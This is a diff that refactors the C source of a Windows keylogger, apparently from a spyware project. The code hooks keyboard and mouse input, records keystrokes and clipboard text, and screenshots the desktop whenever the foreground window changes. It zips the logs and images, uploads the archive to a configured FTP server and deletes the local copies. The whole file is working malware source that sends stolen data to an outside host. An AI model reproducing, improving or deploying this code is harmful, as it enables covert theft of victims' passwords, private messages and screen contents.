@@ -1,7 +1,18 @@
 #include "functions.h"
 
-DWORD start_time = GetTickCount();
-int i_bmp = -1;
+static DWORD start_time;
+static int i_bmp;
+static bool first;
+static char bmp_files[N_FILES][STR_SIZE];
+static HWND old_window;
+
+void init_vars()
+{
+    start_time = GetTickCount();
+    i_bmp = -1;
+    first = true;
+    old_window = NULL;
+}
 
 void get_this_dir_path(char *this_dir_path)
 {
@@ -15,11 +26,14 @@ void get_this_dir_path(char *this_dir_path)
     this_dir_path[len_path] = '\0';
 }
 
-SOCKET create_sock( char * serverHost, short serverPort )
+SOCKET create_socket( char * serverHost, int serverPort )
 {
-	SOCKET Socket=INVALID_SOCKET;
+    SOCKET Socket = INVALID_SOCKET;
+    WSADATA WsaDat;
+    struct hostent *host;
+    SOCKADDR_IN SockAddr;
+
 	// Initialise Winsock
-	WSADATA WsaDat;
 	if (  WSAStartup( MAKEWORD(2,2), &WsaDat ) != 0 )
 	{
 		//printf( "WSA Initialization failed! Error code: %d\n", WSAGetLastError() );
@@ -36,7 +50,6 @@ SOCKET create_sock( char * serverHost, short serverPort )
 	}
 
 	// Resolve IP address for hostname
-	struct hostent *host;
 	if ( ( host = gethostbyname( serverHost ) ) == NULL )
 	{
 		//printf( "Failed to resolve hostname. Error code: %d\n", WSAGetLastError() );
@@ -45,7 +58,6 @@ SOCKET create_sock( char * serverHost, short serverPort )
 	}
 
 	// Setup our socket address structure
-	SOCKADDR_IN SockAddr;
     SockAddr.sin_port = htons( (u_short)serverPort );
 	SockAddr.sin_family = AF_INET;
 	SockAddr.sin_addr.s_addr = *( (unsigned long*)host->h_addr );
@@ -68,10 +80,10 @@ void delete_socket(SOCKET s)
 	WSACleanup();	// Cleanup Winsock
 }
 
-unsigned long _random()
+int _random()
  {
-	unsigned long x, y, rnd;
-	srand(time(NULL));
+    int x, y, rnd;
+    srand((unsigned int)time(NULL));
 	x = rand();
 	y = rand();
 	rnd = x+y;
@@ -97,9 +109,10 @@ bool  save_bitmap(char *szFilename, HBITMAP hBitmap)
 
 		if(bmpInfo.bmiHeader.biSizeImage <= 0)
 		{
-			bmpInfo.bmiHeader.biSizeImage =  bmpInfo.bmiHeader.biWidth 
-											* abs(bmpInfo.bmiHeader.biHeight)
-											* (bmpInfo.bmiHeader.biBitCount + 7) / 8;
+            bmpInfo.bmiHeader.biSizeImage =  (unsigned long)
+                                            ( bmpInfo.bmiHeader.biWidth
+                                            * abs(bmpInfo.bmiHeader.biHeight)
+                                            * (bmpInfo.bmiHeader.biBitCount + 7) / 8);
 		}
 
 		if((pBuf = malloc(bmpInfo.bmiHeader.biSizeImage)) == NULL)
@@ -113,7 +126,7 @@ bool  save_bitmap(char *szFilename, HBITMAP hBitmap)
 		GetDIBits(	hdc,
 					hBitmap,
 					0,
-					bmpInfo.bmiHeader.biHeight,
+                    (unsigned int)bmpInfo.bmiHeader.biHeight,
 					pBuf, 
 					&bmpInfo, 
 					DIB_RGB_COLORS);
@@ -159,12 +172,14 @@ bool screen_shot(char *szFilename, int Top, int Left, int Width, int Height)
 	HWND hDesktopWnd = GetDesktopWindow();
 	HDC hDesktopDC = GetDC(hDesktopWnd);
 	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
+    bool result;
+
 	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, Width, Height);
 
 	SelectObject(hCaptureDC,hCaptureBitmap);
 	BitBlt(hCaptureDC, 0, 0, Width, Height, hDesktopDC, Left, Top, SRCCOPY);
 
-	bool result = save_bitmap(szFilename, hCaptureBitmap);
+    result = save_bitmap(szFilename, hCaptureBitmap);
 
 	ReleaseDC(hDesktopWnd, hDesktopDC);
 	DeleteDC(hCaptureDC);
@@ -173,14 +188,16 @@ bool screen_shot(char *szFilename, int Top, int Left, int Width, int Height)
 	return result;
 }
 
-void get_registry_key( HKEY hKey, char *keyPath, char *keyName, char * reg_key )
+void get_registry_key( HKEY hKey,
+                       char *keyPath,
+                       char *keyName,
+                       char * reg_key )
 {
 	HKEY rKey;
-	unsigned char keyData[STR_SIZE];
-		
-	DWORD Type= REG_SZ, 
-				sizeData = sizeof( keyData );
+	unsigned char keyData[STR_SIZE];	
 	long res;
+    DWORD Type= REG_SZ;
+    DWORD sizeData = sizeof( keyData );
 	
 	res = RegOpenKeyEx( 	hKey, 
                             (LPCWSTR)keyPath,
@@ -203,14 +220,15 @@ void get_registry_key( HKEY hKey, char *keyPath, char *keyName, char * reg_key )
 	RegCloseKey( rKey );	
 }
 
-bool set_registry_key( HKEY hKey, const char keyPath[],
-                       const char keyName[], char *keyData )
+bool set_registry_key( HKEY hKey,
+                       const char keyPath[],
+                       const char keyName[],
+                       char *keyData )
 {
 	HKEY rKey;
-
-	DWORD Type= REG_SZ, 
-				sizeData = strlen( keyData ),
-				disposition;
+    DWORD Type= REG_SZ;
+    DWORD sizeData = strlen( keyData );
+    DWORD disposition;
 	long res;
 	
 	res = RegCreateKeyEx(	hKey, 
@@ -248,9 +266,12 @@ bool set_registry_key( HKEY hKey, const char keyPath[],
 int get_data_port(char *str)
 {
 	//"227 Entering Passive Mode (193,109,247,233,162,136)" -> p1=162, p2=136
-	char *pch = strtok (str,"(");
-	int j=0;
-	int p1=0, p2=0;
+    char *pch;
+    int j = 0;
+    int p1 = 0;
+    int p2 = 0;
+
+    pch = strtok(str,"(");
 	while (pch != NULL) 
 	{
 		pch = strtok (NULL, ",)");
@@ -271,59 +292,61 @@ int get_data_port(char *str)
 	return port;
 }
 
-void send_cmd(char *cmd, SOCKET socket)
+void send_cmd(SOCKET socket, char *cmd)
 {
 	//printf( "client: %s", cmd );
-	send( socket, cmd, strlen(cmd), 0);
+    send( socket, cmd, (int)strlen(cmd), 0);
 }
 
-char *recv_msg(SOCKET socket)
+void recv_msg(SOCKET socket, char *get_buffer, unsigned int size)
 {
-	char get_buffer[CMD_SIZE];
-	memset(get_buffer, 0, sizeof(get_buffer));
-	recv( socket, get_buffer, sizeof(get_buffer), 0 ) ;
-	//printf( "server: %s", get_buffer );
-
-	return get_buffer;
+    memset(get_buffer, 0, size);
+    recv( socket, get_buffer, (int)size, 0 ) ;
+    //printf( "server: %s", get_buffer );
 }
 
-bool upload_file(	char *host,
-					char *port,
-					char *user_name,
-					char *user_pass,
-                    const char ftp_dir[],
-					char *file_name,
-					char *path_file )
+bool upload_file(	struct
+                    ftp_config *config,
+                    char *file_name,
+                    char *path_file )
 {
-	
-	SOCKET socket_data = SOCKET_ERROR;
-	SOCKET socket = SOCKET_ERROR;
+    SOCKET socket;
+    SOCKET socket_data;
+    FILE* file;
+    char *file_buffer;
+    int size;
+    int port_data;
+    size_t len;
+
+    char get_buffer[CMD_SIZE];
+    char buffer[CMD_SIZE];
+    char tmp1[CMD_SIZE];
+    char tmp2[CMD_SIZE];
 	
 	char cmd_user[CMD_SIZE];
 	char cmd_pass[CMD_SIZE];
-	char cmd_cwd[CMD_SIZE];
+    char cmd_cwd[CMD_SIZE];
 	char cmd_pwd[CMD_SIZE];
 	char cmd_type[CMD_SIZE];
 	char cmd_pasv[CMD_SIZE];
 	char cmd_stor[CMD_SIZE];
 
-	sprintf(cmd_user, "%s %s\r\n", USER, user_name);
-	sprintf(cmd_pass, "%s %s\r\n", PASS, user_pass);
-	sprintf(cmd_cwd, "%s %s\r\n", CWD, ftp_dir);
+    sprintf(cmd_user, "%s %s\r\n", USER, config->login);
+    sprintf(cmd_pass, "%s %s\r\n", PASS, config->password);
+    sprintf(cmd_cwd, "%s %s\r\n", CWD, config->dir);
 	sprintf(cmd_pwd, "%s\r\n", PWD);
 	sprintf(cmd_type, "%s\r\n", TYPE_I);
 	sprintf(cmd_pasv, "%s\r\n", PASV);	
 	sprintf(cmd_stor, "%s %s\r\n", STOR, file_name);
 	
-	socket = create_sock( host, atoi(port) );
+    socket = create_socket( config->host, atoi(config->port) );
 	if ( !socket )
 	{
 		//printf("Error creating socket!");
 		return false;
 	}
 
-	FILE* file = fopen(path_file, "rb");
-
+    file = fopen(path_file, "rb");
     if (!file)
 	{
         //printf("File unavaible.\n");
@@ -331,51 +354,48 @@ bool upload_file(	char *host,
     }
 
 	fseek(file, 0, SEEK_END);
-    int size = ftell(file);
+    size = ftell(file);
 	fseek(file, 0, SEEK_SET);
 
-	char *file_buffer;
 	if (size <= FILE_BUFF_SIZE)
 	{
-		file_buffer = (char*)malloc(sizeof(char)*size);
+        file_buffer = (char*)malloc(sizeof(char)*((unsigned int)size));
 	}
 	else
 	{
 		file_buffer = (char*)malloc(sizeof(char)*FILE_BUFF_SIZE);
 	}
 
-	char get_buffer[CMD_SIZE];
+    len = 1;
 
-	size_t len = 1;
+    recv_msg(socket, buffer, sizeof(buffer));
+    send_cmd(socket, cmd_user);
+    recv_msg(socket, buffer, sizeof(buffer));
+    send_cmd(socket, cmd_pass);
+    recv_msg(socket, buffer, sizeof(buffer));
+    send_cmd(socket, cmd_cwd);
+    recv_msg(socket, buffer, sizeof(buffer));
+    send_cmd(socket, cmd_type);
+    recv_msg(socket, buffer, sizeof(buffer));
 
-	recv_msg(socket);
-	send_cmd(cmd_user, socket);
-	recv_msg(socket);
-	send_cmd(cmd_pass, socket);
-	recv_msg(socket);
-	send_cmd(cmd_cwd, socket);
-	recv_msg(socket);
-	send_cmd(cmd_type, socket);
-	recv_msg(socket);
+    send_cmd(socket, cmd_pasv);
+    recv_msg(socket, tmp1, sizeof(tmp1));
+    sprintf(get_buffer, "%s", tmp1);
 
-	send_cmd(cmd_pasv, socket);
-	char *tmp1 = recv_msg(socket);
-	sprintf(get_buffer, "%s", tmp1);
+    send_cmd(socket, cmd_stor);
 
-	send_cmd(cmd_stor, socket);
+    port_data = get_data_port(get_buffer);
+    socket_data = create_socket(config->host, port_data);
 
-	int port_data = get_data_port(get_buffer);
-	socket_data = create_sock(host, port_data);
-	char *tmp2 = recv_msg(socket);
+    recv_msg(socket, tmp2, sizeof(tmp2));
 	sprintf(get_buffer, "%s", tmp2);
 
 	if (strstr(get_buffer, ACCEPT_DATA) != NULL)
 	{						
 		//printf("Send file size %d bytes\n", size);
-
 		while( (len = fread(file_buffer, len, 1, file))  > 0)
 		{
-			if( 0 > send(socket_data, file_buffer, len, 0) )
+            if( 0 > send(socket_data, file_buffer, (int)len, 0) )
 			{
 				perror("Error sending data!");
 				break;
@@ -385,7 +405,7 @@ bool upload_file(	char *host,
 	
 	fclose(file);
 	delete_socket(socket_data);
-	recv_msg(socket);	
+    recv_msg(socket, buffer, sizeof(buffer));
 	delete_socket(socket);
 
 	return true;
@@ -401,16 +421,16 @@ void write_log(const char *data)
 	}
 }
 
-char old_data[STR_SIZE_MAX];
-bool first = true;
 void set_clipboard()
 {
+    static char old_data[STR_SIZE_MAX];
+
 	if(OpenClipboard(NULL))
 	{
 		char *data = (char*)GetClipboardData(CF_TEXT);
 		if (first)
 		{
-			sprintf(old_data, data);
+            sprintf(old_data, "%s", data);
 			first = false;
 		}
 
@@ -418,7 +438,7 @@ void set_clipboard()
 		{
 			if (strcmp(data, old_data)) 
 			{				
-				sprintf(old_data, data);
+                sprintf(old_data, "%s", data);
 				write_log(data);
 				write_log("\n");
 			}
@@ -427,13 +447,14 @@ void set_clipboard()
 	}
 }
 
-HWND old_window = NULL;
-char bmp_file[N_FILES][STR_SIZE];
 void change_window()
 {
-	HWND newWindow = GetForegroundWindow();
 	char cWindow[STR_SIZE];
 	char info_title[STR_SIZE_MAX];
+    char tmp_str[STR_SIZE];
+    bool result;
+    HWND newWindow = GetForegroundWindow();
+
 	if(old_window == NULL || newWindow != old_window)
 	{
 		// Get Active window title and store it
@@ -443,13 +464,12 @@ void change_window()
 		old_window = newWindow;
 
 		// Create screenshot
-		++i_bmp;
-		char tmp_str[STR_SIZE];
+		++i_bmp;		
 		sprintf(tmp_str, "file_%d.bmp", i_bmp);
-		strcpy(bmp_file[i_bmp], tmp_str);		
-		bool result = screen_shot(	bmp_file[i_bmp], 0, 0, 
-									GetSystemMetrics(SM_CXSCREEN), 
-									GetSystemMetrics(SM_CYSCREEN) );
+        strcpy(bmp_files[i_bmp], tmp_str);
+        result = screen_shot(	bmp_files[i_bmp], 0, 0,
+                                GetSystemMetrics(SM_CXSCREEN),
+                                GetSystemMetrics(SM_CYSCREEN) );
 		if (!result)
 		{
 			if (i_bmp >= 0)
@@ -458,15 +478,19 @@ void change_window()
 	}
 }
 
-bool shift = false;
+
 int CALLBACK keyoard_hook(int n_code, DWORD w_param, DWORD l_param)
 {
-	KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)l_param;
+    DWORD finish_time;
+    DWORD diff_time_sec;
+    bool caps;
+    static bool shift = false;
+    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)l_param;
 
 	if(n_code == HC_ACTION)
 	{
 		
-		bool caps = GetKeyState(VK_CAPITAL) > 0; //CapsLock on|off
+        caps = GetKeyState(VK_CAPITAL) > 0; //CapsLock on|off
 	
 		if (GetAsyncKeyState(VK_CONTROL)) // Ctrl +
 		{
@@ -490,8 +514,8 @@ int CALLBACK keyoard_hook(int n_code, DWORD w_param, DWORD l_param)
 		change_window();
 	}
 
-	DWORD finish_time = GetTickCount();
-	DWORD diff_time_sec = (finish_time - start_time) / 1000;
+    finish_time = GetTickCount();
+    diff_time_sec = (finish_time - start_time) / 1000;
 
 	if (diff_time_sec >= INTERVAL_TIME) 
 	{
@@ -500,7 +524,7 @@ int CALLBACK keyoard_hook(int n_code, DWORD w_param, DWORD l_param)
 		start_time = GetTickCount();
 	}
 
-	return CallNextHookEx(NULL, n_code, w_param, l_param);
+    return CallNextHookEx(NULL, n_code, w_param, (LPARAM)l_param);
 }
 
 LRESULT CALLBACK mouse_hook(int n_code, DWORD w_param, DWORD l_param)
@@ -511,55 +535,52 @@ LRESULT CALLBACK mouse_hook(int n_code, DWORD w_param, DWORD l_param)
         change_window();
 	}
 
-	return CallNextHookEx(NULL, n_code, w_param, l_param);
+    return CallNextHookEx(NULL, n_code, w_param, (LPARAM)l_param);
 }
 
 bool send_file()
 {
-	char ho[STR_SIZE];
-	char po[STR_SIZE];
-	char lo[STR_SIZE];
-    char pa[STR_SIZE];
-    read_config( CONF_FILE, ho, po, lo, pa );
-//TODO path
-    char zip_path[STR_SIZE];
-    get_this_dir_path(zip_path);
-	char zip_file[STR_SIZE];
-	char zip_file_path[CMD_SIZE];
-	sprintf(zip_file, "%s%d%s", "data", _random(), ".zip");
-	sprintf(zip_file_path, "%s%s", zip_path, zip_file);
-	
-	create_zip_file(zip_file_path, bmp_file, LOG_FILE);
+    struct ftp_config ftp;
+    char path[STR_SIZE];
+    char zip_file_name[STR_SIZE];
+    char zip_file_path[STR_SIZE];
+    bool uploaded;
 
-	bool uploaded = upload_file( ho, po, lo, pa, "\/", zip_file, zip_file_path);
+    read_config( CONF_FILE, &ftp );
+    sprintf(ftp.dir, FTP_DIR);
+    get_this_dir_path(path);
+    sprintf(zip_file_name, "%s%d%s", "data", _random(), ".zip");
+    sprintf(zip_file_path, "%s%s", path, zip_file_name);
+	
+    create_zip_file(zip_file_path, LOG_FILE);
+    uploaded = upload_file( &ftp, zip_file_name, zip_file_path);
 	if(uploaded)
 		remove(zip_file_path);
 
 	return uploaded;
 }
 
-void create_zip_file(char *path_zip_file, 
-					 char screen_file[N_FILES][STR_SIZE], 
+void create_zip_file(char *path_zip_file, 					
                      const char log_file[])
 {
-    struct zip_t *zip = zip_open(path_zip_file, ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');
+    struct zip_t *zip = zip_open(path_zip_file,
+                                 ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');
+
+    for(int i=0; i <= i_bmp; i++)
     {
-        for(int i=0; i <= i_bmp; i++)
-        {
-            zip_entry_open(zip, screen_file[i]);
-            zip_entry_fwrite(zip, screen_file[i]);
-            zip_entry_close(zip);
-        }
-
-        zip_entry_open(zip, log_file);
-        zip_entry_fwrite(zip, log_file);
+        zip_entry_open(zip, bmp_files[i]);
+        zip_entry_fwrite(zip, bmp_files[i]);
         zip_entry_close(zip);
-
     }
+
+    zip_entry_open(zip, log_file);
+    zip_entry_fwrite(zip, log_file);
+    zip_entry_close(zip);
+
     zip_close(zip);
 
 	for(int i=0; i <= i_bmp; i++)
-		remove( screen_file[i] );
+        remove( bmp_files[i] );
 
 	remove( log_file ); 
 
@@ -568,26 +589,31 @@ void create_zip_file(char *path_zip_file,
 
 bool copy_file(char *src_file_path, char *dst_file_path)
 {
-    FILE *src_file = fopen(src_file_path, "rb");
+    long size_src_file;
+    FILE *src_file;
+    FILE *dst_file;
+    BYTE *buff;
+
+    src_file = fopen(src_file_path, "rb");
 	if(!src_file)
 	{
 		return false;
 	}
 
 	fseek(src_file, 0, SEEK_END); //to end of file
-	long size_src_file = ftell(src_file); // size of file
+    size_src_file = ftell(src_file); // size of file
 	rewind(src_file); //to begin of file
 
-	FILE *dst_file = fopen(dst_file_path, "wb");
+    dst_file = fopen(dst_file_path, "wb");
 	if(!dst_file)
 	{
 		return false;
 	}
 
-	BYTE *buff = (BYTE*)malloc(sizeof(BYTE)*size_src_file);
+    buff = (BYTE*)malloc(sizeof(BYTE)*(unsigned long)size_src_file);
 
-	fread(buff, 1, size_src_file, src_file);
-	fwrite(buff, 1, size_src_file, dst_file);
+    fread(buff, 1, (unsigned int)size_src_file, src_file);
+    fwrite(buff, 1,(unsigned int) size_src_file, dst_file);
 
 	fclose(src_file);
 	fclose(dst_file);
@@ -595,66 +621,54 @@ bool copy_file(char *src_file_path, char *dst_file_path)
 	return true;
 }
 
-bool read_config(	const char config[80],
-					char *host,
-					char *port,
-					char *login,
-					char *password )
+void null_terminate(char *param)
 {
-	FILE *file = fopen(config, "r");
-	if(!file)
+    if(param[strlen(param)-1] == LF)
+    {
+        param[strlen(param)-1] = '\0';
+    } else {
+        param[strlen(param)] = '\0';
+    }
+}
+
+bool read_config(	const char config_file[],
+                    struct ftp_config *ftp )
+{
+    char str[STR_SIZE];
+    FILE *file;
+
+    file = fopen(config_file, "r");
+    if(!file)
 	{
 		puts("File not open!\n");
 		return false;
 	}
 	
-	char str[STR_SIZE];
-#define LF 0x0a
 	while( fgets(str, STR_SIZE, file) )
 	{
 		if( strstr(str, "host") != NULL )
 		{	
 			strtok(str, " :"); 
-			sprintf(host, strtok(NULL, " :"));
-            if(host[strlen(host)-1]==LF)
-            {
-                host[strlen(host)-1] = '\0';
-            } else {
-                host[strlen(host)] = '\0';
-            }
+            sprintf(ftp->host, strtok(NULL, " :"));
+            null_terminate(ftp->host);
 		}
 		else if( strstr(str, "port") != NULL )
 		{	
 			strtok(str, " :"); 
-			sprintf(port, strtok(NULL, " :"));
-            if(port[strlen(port)-1]==LF)
-            {
-                port[strlen(port)-1] = '\0';
-            } else {
-                port[strlen(port)] = '\0';
-            }
+            sprintf(ftp->port, strtok(NULL, " :"));
+            null_terminate(ftp->port);
 		}
 		else if( strstr(str, "login") != NULL )
 		{	
 			strtok(str, " :"); 
-			sprintf(login, strtok(NULL, " :"));
-            if(login[strlen(login)-1]==LF)
-            {
-                login[strlen(login)-1] = '\0';
-            } else {
-                login[strlen(login)] = '\0';
-            }
+            sprintf(ftp->login, strtok(NULL, " :"));
+            null_terminate(ftp->login);
 		}
 		else if( strstr(str, "password") != NULL )
 		{	
 			strtok(str, " :"); 
-			sprintf(password, strtok(NULL, " :"));
-            if(password[strlen(password)-1]==LF)
-            {
-                password[strlen(password)-1] = '\0';
-            } else {
-                password[strlen(password)] = '\0';
-            }
+            sprintf(ftp->password, strtok(NULL, " :"));
+            null_terminate(ftp->password);
 		}
 	}
 	return true;
@@ -756,7 +770,7 @@ void write_char_code(DWORD vk_code, bool shift, bool caps)
 		case VK_OEM_7: write_log(shift?"\"":"'");break;
 		case VK_OEM_PLUS: write_log(shift?"+":"=");break;
 		case VK_OEM_COMMA: write_log(shift?"<":",");break;
-		case VK_OEM_MINUS: write_log(shift?+"_":"-");break;
+        case VK_OEM_MINUS: write_log(shift?"_":"-");break;
 		case VK_OEM_PERIOD: write_log(shift?">":".");break;
 	}
 }
